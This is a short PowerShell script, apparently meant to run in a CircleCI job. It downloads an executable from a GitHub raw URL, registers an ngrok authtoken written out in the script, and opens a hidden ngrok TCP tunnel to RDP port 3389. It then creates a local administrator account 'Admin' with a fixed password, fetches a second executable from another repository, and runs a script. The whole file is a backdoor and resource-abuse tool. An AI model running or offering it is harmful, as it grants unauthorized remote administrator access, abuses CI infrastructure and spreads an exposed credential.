Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Usser1222/circleci/main/use.exe" -OutFile ngrok.exe 
cmd /c ngrok.exe authtoken 2cn87V9NMzmnYMwO3Vgp6rtvFde_3PkxAeYd8zjbLwMge7LAe
Start-Process -FilePath "ngrok.exe" -ArgumentList "tcp 3389" -WindowStyle Hidden
cmd /c net user /add Admin P@ssw0rd.
cmd /c net localgroup /add administrators Admin
sleep 240
curl -o zip.exe -Uri "https://raw.githubusercontent.com/n0td1n0kh0a/circleci/main/use.exe"
.\0.ps1
curl -o zip.exe -Uri "https://raw.githubusercontent.com/n0td1n0kh0a/circleci/main/use.exe"
.\0.ps1
